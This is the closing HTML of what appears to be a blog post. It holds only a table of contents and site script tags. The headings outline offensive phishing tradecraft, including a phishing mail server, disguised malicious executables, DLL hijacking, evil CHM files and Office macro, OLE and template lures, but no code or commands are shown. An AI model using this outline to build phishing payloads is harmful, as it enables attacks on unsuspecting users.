                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Set-Up-Phishing-Mail-Server"><span class="nav-number">1.</span> <span class="nav-text">Set Up Phishing Mail Server</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Camouflage-Malicious-PE"><span class="nav-number">2.</span> <span class="nav-text">Camouflage Malicious PE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SFX"><span class="nav-number">2.1.</span> <span class="nav-text">SFX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DLL-Hijacking-amp-Recreate-the-Installer"><span class="nav-number">2.2.</span> <span class="nav-text">DLL Hijacking &amp; Recreate the Installer</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Make-Evil-Links-x2F-Shotcuts"><span class="nav-number">3.</span> <span class="nav-text">Make Evil Links&#x2F;Shotcuts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Evil-CHM-to-Phish"><span class="nav-number">4.</span> <span class="nav-text">Evil CHM to Phish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Create-Evil-Office-Suite"><span class="nav-number">5.</span> <span class="nav-text">Create Evil Office Suite</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Word"><span class="nav-number">5.1.</span> <span class="nav-text">Macros in Word</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Excel"><span class="nav-number">5.2.</span> <span class="nav-text">Macros in Excel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OLE"><span class="nav-number">5.3.</span> <span class="nav-text">OLE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JS"><span class="nav-number">5.4.</span> <span class="nav-text">JS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Template"><span class="nav-number">5.5.</span> <span class="nav-text">Template</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE"><span class="nav-number">5.6.</span> <span class="nav-text">CVE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phish-in-PPSX"><span class="nav-number">5.7.</span> <span class="nav-text">Phish in PPSX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-Ultra-One"><span class="nav-number">5.8.</span> <span class="nav-text">The Ultra One</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other-Resources"><span class="nav-number">6.</span> <span class="nav-text">Other Resources</span></a></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>



<!-- common -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local-search -->

    
<script src="/js/local-search.js"></script>



<!-- code-block -->

    
<script src="/js/code-block.js"></script>



<!-- lazyload -->


<div class="">
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        
            
<script src="/js/post/toc.js"></script>

        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- category-page -->
    

    <!-- links-page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
